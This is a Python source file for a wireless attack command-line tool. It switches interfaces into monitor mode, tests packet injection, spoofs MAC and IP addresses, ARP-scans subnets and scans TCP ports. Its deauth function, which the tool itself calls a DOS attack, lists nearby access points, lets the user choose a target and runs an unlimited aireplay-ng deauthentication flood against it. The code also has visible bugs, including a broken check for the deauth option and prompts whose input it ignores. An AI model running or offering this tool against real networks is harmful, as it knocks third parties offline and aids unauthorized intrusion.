import subprocess
import os
import colorama
from colorama import Fore
import re
import scapy.all as scapy
import time
import shutil
from datetime import datetime
import optparse
import csv
import socket
import tkinter
import ipaddress

parser = optparse.OptionParser()
parser.add_option("-i", dest="interface", help="Used to to specify interface ** it's a mandatory command **")
parser.add_option("--cip", dest="cip1", help="Used to change IP Address of the interface and type Ip Address to be set")
parser.add_option("--cmac", dest="cmac1", help="Used to change MAC Address of the interface and type MAC Address to be set")
parser.add_option("--mon", dest="mon1", help="Used to change the mode of interface to monitor and type Y to continue")
parser.add_option("--man", dest="man1", help="Used To change the mode of interface to managed and type Y to continue")
parser.add_option("--pis", dest="pis1", help="Used to check packet injection support on interface and type Y to continue")
parser.add_option("--scan", dest="scan1", help="Used to scan devices on locale subnet and type Y to continue")
parser.add_option("--deauth", dest="deauth", help="Used to run DOS Attack")
parser.add_option("--info", dest="info1", help="Get's you all info and type Y to continue")
parser.add_option("--ps", dest="port_scanner", help="Help's you to scan Port's of an ip address")
(options, arguments) = parser.parse_args()
interface = options.interface
cip1 = options.cip1
cmac1 = options.cmac1
mon1 = options.mon1
man1 = options.man1
scan1 = options.scan1
pis1 = options.pis1
info1 = options.info1
deauth1 = options.deauth
ps = options.port_scanner
colorama.init(autoreset=True)

if not 'SUDO_UID' in os.environ.keys():
    print("Try running this program with sudo.")
    exit()
cmdlist = ["mon", "pis", "man", "interface", "info", "cmac", "cip", "list", "help", "scan","exit", "portscanner", "ps", "vulscan", "vs", "pfe"]

if interface == None:
    print("Use '-i' and specify interface.")
    quit()
interface1 = str(interface) + "mon"
def logo():
    print(Fore.RED + r"""
    
 ____           ____  _           _     
|  _ \ _____  _|  _ \| |_   _ ___| |__  
| |_) / _ \ \/ / |_) | | | | / __| '_ \ 
|  _ <  __/>  <|  __/| | |_| \__ \ | | |
|_| \_\___/_/\_\_|   |_|\__,_|___/_| |_|
                                         

    """)
def info():
    cmd = subprocess.run(f"ifconfig {interface}", shell=True, capture_output=True).stdout.decode()
    macst1 = re.search("ether \w\w:\w\w:\w\w:\w\w:\w\w:\w\w", cmd)
    print(macst1.group(0))
    def monspec():
        cmd = subprocess.run("sudo airmon-ng start " + interface, shell=True, capture_output=True).stdout.decode()
        cmd1 = subprocess.run("iwconfig " + interface1, shell=True, capture_output=True).stdout.decode()
        mode = re.search(r"Mode:\w\w\w\w\w\w\w", cmd1)
        if "Mode:Monitor" in str(mode):
            print(Fore.GREEN + "Monitor mode is working!")
        else:
            print(Fore.RED + "Monitor mode doesn't support ")
    def man(interface):
        cmd = subprocess.run("sudo airmon-ng stop " + interface1, shell=True, capture_output=True)
    monspec()
    injection = subprocess.run(f"aireplay-ng --test {interface1}", shell=True, capture_output=True).stdout.decode()
    if "Injection is working!" in str(injection):
        print(Fore.GREEN + "Packet injection is supported")
    else:
        print(Fore.RED + "Packet injection is not supported")
    cmd = subprocess.run(f"iwlist {interface} freq", shell=True, capture_output=True).stdout.decode()
    if "5.2 GHz" in cmd:
        print(Fore.CYAN + "2.4 & 5Ghz is supported")
    else:
        print(Fore.CYAN + "2.4 GHz is only supported")
    man(interface)
def pis(interface, interface1):
    def mon(interface):
        cmd = subprocess.run("sudo airmon-ng start " + interface, shell=True, capture_output=True).stdout.decode()
        commandf = subprocess.run("iwconfig " + interface1, capture_output=True, shell=True).stdout.decode()
        mode = re.search(r"Mode:\D\D\D\D\D\D\D", commandf)
        modee = str(mode).replace("Mode:", "")
    def man(interface):
        cmd = subprocess.run("sudo airmon-ng stop " + interface1, shell=True, capture_output=True)
        time.sleep(3)
        commandf = subprocess.run("iwconfig " + interface, capture_output=True, shell=True).stdout.decode()
        mode = re.search(r"Mode:\D\D\D\D\D\D\D", commandf)
        modee = str(mode).replace("Mode:", "")
    mon(interface)
    packet = subprocess.run("sudo aireplay-ng --test " + interface1, shell=True, capture_output=True).stdout.decode()
    check = str(re.search(r"Injection is working!", packet))
    if "Injection is working!" in check:
        print(Fore.GREEN + "Packet Injection is supported on this interface!")
    else:
        print(Fore.RED + "This interface Does not support packet injection")
    man(interface)
def mon(interface):
    cmd = subprocess.run("sudo airmon-ng start " + interface, shell=True, capture_output=True).stdout.decode()
    commandf = subprocess.run("iwconfig " + interface1, capture_output=True, shell=True).stdout.decode()
    mode = re.search(r"Mode:\D\D\D\D\D\D\D", commandf)
    modee = str(mode).replace("Mode:", "")
    if "Monitor" in modee:
        print(Fore.GREEN + 'Your interface set into Monitor mode')
    else:
        print("Something went wrong")
def man(interface):
    cmd = subprocess.run("sudo airmon-ng stop " + interface1, shell=True, capture_output=True).stdout.decode()
    time.sleep(3)
    commandf = subprocess.run("iwconfig " + interface, capture_output=True, shell=True).stdout.decode()
    mode = re.search(r"Mode:\D\D\D\D\D\D\D", commandf)
    modee = str(mode).replace("Mode:", "")
    if "Managed" in modee:
        print(Fore.GREEN + 'Your interface set into Managed mode')
    else:
        print("Something went wrong")
def cmac(interface, new_mac):
    print(Fore.GREEN + "[+]Changing MAC Address of " + interface + " to " + new_mac)
    time.sleep(2)
    subprocess.run("sudo ifconfig " + interface + " down", shell=True)
    subprocess.run("sudo ifconfig " + interface + " hw ether " + new_mac,shell=True)
    subprocess.run("sudo ifconfig " + interface + " up", shell=True)
    check = subprocess.run("ifconfig " + interface, capture_output=True, shell=True).stdout.decode()
    updated_mac = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", check)
    updated_mac1 = updated_mac.group(0)
    if updated_mac1 == new_mac:
        print(Fore.GREEN + "[+]MAC Address has been changed sucessfully")
    if updated_mac1 != new_mac:
        print(Fore.RED + "Something went wrong try again")
def cip(interface, new_ip):
    print(Fore.GREEN + "[+]Changing IP Address of " + interface + " to  " + new_ip)
    time.sleep(2)
    subprocess.run("ifconfig " +interface + " inet " + new_ip, shell=True)
    command = subprocess.run("ifconfig " + interface, capture_output=True, shell=True).stdout.decode()
    print(Fore.GREEN + "Your ip address has been changed")
def scan(ip_add_range_entered):
    ip_add_range_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]*$")
    while True:
        if ip_add_range_pattern.search(ip_add_range_entered):
            print(f"{ip_add_range_entered} is a valid ip address range")
            break
        else:
            print("Enter a valid ip address and range and Try Again")
            quit()
    arp_result = scapy.arping(ip_add_range_entered)
def deauth():
    active_wireless_networks = []
    def check_for_essid(essid, lst):
        check_status = True
        if len(lst) == 0:
            return check_status
        for item in lst:
            if essid in item["ESSID"]:
                check_status = False

        return check_status
    if not 'SUDO_UID' in os.environ.keys():
        print("Try running this program with sudo.")
        exit()
    for file_name in os.listdir():
        if ".csv" in file_name:
            print("There shouldn't be any .csv files in your directory. We found .csv files in your directory.")
            directory = os.getcwd()
            try:
                os.mkdir(directory + "/backup/")
            except:
                print("Backup folder exists.")
            timestamp = datetime.now()
            shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)
    wlan_pattern = re.compile("^wlan[0-9]+")
    check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
    if len(check_wifi_result) == 0:
        print("Please connect a WiFi controller and try again.")
        exit()
    print("The following WiFi interfaces are available:")
    for index, item in enumerate(check_wifi_result):
        print(f"{index} - {item}")
    while True:
        wifi_interface_choice = input("Please select the interface you want to use for the attack: ")
        try:
            if check_wifi_result[int(wifi_interface_choice)]:
                break
        except:
            print("Please enter a number that corresponds with the choices.")
    hacknic = check_wifi_result[int(wifi_interface_choice)]
    print("WiFi adapter connected!\nNow let's kill conflicting processes:")
    kill_confilict_processes = subprocess.run(["sudo", "airmon-ng", "check", "kill"])
    print("Putting Wifi adapter into monitored mode:")
    put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])
    discover_access_points = subprocess.Popen(
        ["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv",
         check_wifi_result[0] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        while True:
            subprocess.call("clear", shell=True)
            for file_name in os.listdir():
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher',
                              'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)

            print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
            print("No |\tBSSID              |\tChannel|\tESSID                         |")
            print("___|\t___________________|\t_______|\t______________________________|")
            for index, item in enumerate(active_wireless_networks):
                print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
            time.sleep(1)

    except KeyboardInterrupt:
        print("\nReady to make choice.")
    while True:
        choice = input("Please select a choice from above: ")
        try:
            if active_wireless_networks[int(choice)]:
                break
        except:
            print("Please try again.")
    hackbssid = active_wireless_networks[int(choice)]["BSSID"]
    hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
    subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
    subprocess.Popen(
        ["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        while True:
            print("Deauthenticating clients, press ctrl-c to stop")
    except KeyboardInterrupt:
        print("Stop monitoring mode")
        subprocess.run(["airmon-ng", "stop", hacknic + "mon"])
        print("Thank you! Exiting now")
def portscanner(ip_add_entered):
    port_range_pattern = re.compile("([0-9]+)-([0-9]+)")
    port_min = 0
    port_max = 65535

    open_ports = []
    while True:
        try:
            ip_address_obj = ipaddress.ip_address(ip_add_entered)
            print("You entered a valid ip address.")
            break
        except:
            print("You entered an invalid ip address")

    while True:
        print("Please enter the range of ports you want to scan in format: <int>-<int> (ex would be 60-120)")
        port_range = input("Enter port range: ")
        port_range_valid = port_range_pattern.search(port_range.replace(" ", ""))
        if port_range_valid:
            port_min = int(port_range_valid.group(1))
            port_max = int(port_range_valid.group(2))
            break
    for port in range(port_min, port_max + 1):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                s.connect((ip_add_entered, port))
                open_ports.append(port)

        except:
            pass

    for port in open_ports:
        print(f"Port {port} is open on {ip_add_entered}.")
def help():
    help = Fore.CYAN + """
Command 			    Ussage

mon			    Changes interface mode to monitor

pis 			    Checks for Packet injection support

man			    Changes interface mode to managed

interface		    Changes interface

info 			    Gets info of given interface

cmac			    Changes MAC Address

cip			    Changes IP Address

scan                	    Scans all the clients on the network

ps                 	    Used for Scanning port for a ip address or a link

exit                	    Exit the program
"""
    print(help)
def quit():
    exit()
def command_line():
    command = input(Fore.YELLOW + "Run Command:\n")
    if command not in cmdlist:
        print("Command not found")
        command_line()
    if command == "mon":
        mon(interface)
        command_line()
    if command == "pis":
        pis(interface, interface1)
        command_line()
    if command == "man":
        man(interface)
        command_line()
    if command == "interface":
        interface()
        command_line()
    if command == "info":
        info()
        command_line()
    if command == "cmac":
        new_mac = input("Enter a new mac address:")
        cmac(interface, cmac1)
        command_line()
    if command == "cip":
        new_ip = input("Enter a new IP Address: ")
        cip(interface, cip1)
        command_line()
    if command == "help":
        help()
        command_line()
    if command == "list":
        help()
        command_line()
    if command == "deauth":
        deauth()
        command_line()
    if command == "scan":
        scan(scan1)
        command_line()
    if command == "exit":
        quit()
    if command == "ps":
        target = input("Enter a I.P to scan:\n")
        portscanner(target)
if cip1 != None:
    cip(interface, cip1)
    quit()
elif cmac1 != None:
    cmac(interface, cmac1)
    quit()
elif mon1 == "Y":
    mon(interface)
    quit()
elif man1 == "Y":
    man(interface)
    quit()
elif pis1 == "Y":
    pis(interface, interface1)
    quit()
elif info1 == "Y":
    info()
    quit()
elif scan1 != None:
    scan(scan1)
    quit()
elif deauth == None:
    deauth()
    quit()
elif ps != None:
    portscanner(ps)
    quit()
try:
    logo()
    command_line()
except KeyboardInterrupt:
    print(Fore.YELLOW + "\nGoodBye\n")
